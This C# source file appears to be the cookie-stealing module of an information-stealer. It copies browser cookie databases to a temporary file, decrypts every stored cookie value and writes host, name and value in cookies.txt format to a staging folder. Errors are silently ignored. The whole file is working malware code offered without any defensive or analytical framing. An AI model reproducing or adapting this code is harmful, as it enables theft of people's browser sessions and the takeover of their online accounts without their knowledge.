using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using who.Helper;

namespace who.Func
{
    class Cookies
    {
        public static int cookiesCount;

        public static void Get() {
            string text = "";
            List<CookieData> cki = GetCookies();
            foreach (CookieData i in cki)
            {
                text += i.ToString();
            }

            if (text != "")
            {
                if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
                    Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");

                File.WriteAllText(Dirs.WorkDir + "\\Browsers\\Cookies.txt", text, Encoding.Default);                
            }
        }

        public static List<CookieData> GetCookies() 
        {
            List<CookieData> cookieDataList1 = new List<CookieData>();

            

            foreach (string basePath in Dirs.BrowsCookies)
            {
                List<CookieData> cookieDataList2 = FetchCookies(basePath);
                if (cookieDataList2 != null)
                    cookieDataList1.AddRange((IEnumerable<CookieData>)cookieDataList2);
            }
            return cookieDataList1;
        }

        private static List<CookieData> FetchCookies(string basePath)
        {
            if (!File.Exists(basePath))
                return (List<CookieData>)null;

            
            try
            {
                string str2 = Dirs.WorkDir + "test.fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                SqlHandler sqlHandler = new SqlHandler(str2);

                List<CookieData> cookieDataList = new List<CookieData>();
                sqlHandler.ReadTable("cookies");
                for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                {
                    try
                    {
                        string empty = string.Empty;

                        try
                        {
                            empty = Encoding.UTF8.GetString(Passwords.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 12)), (byte[])null));

                        }
                        catch 
                        { }
                        if (empty != "")
                        {
                            cookieDataList.Add(new CookieData()
                            {
                                host_key = sqlHandler.GetValue(rowNum, 1),
                                name = sqlHandler.GetValue(rowNum, 2),
                                path = sqlHandler.GetValue(rowNum, 4),
                                expires_utc = sqlHandler.GetValue(rowNum, 5),
                                secure = sqlHandler.GetValue(rowNum, 6),
                                value = empty,
                            });

                            cookiesCount++;
                        }


                    }
                    catch 
                    { }
                }
                File.Delete(str2);
                return cookieDataList;
            }
            catch 
            {               
                return null;
            }
        }

    }

    class CookieData
    {
        public string host_key { get; set; }

        public string name { get; set; }

        public string value { get; set; }

        public string path { get; set; }

        public string expires_utc { get; set; }

        public string secure { get; set; }

        public override string ToString()
        {
            return string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n",
                host_key, path, secure.ToUpper(), expires_utc, name, value);
        }
    }
}
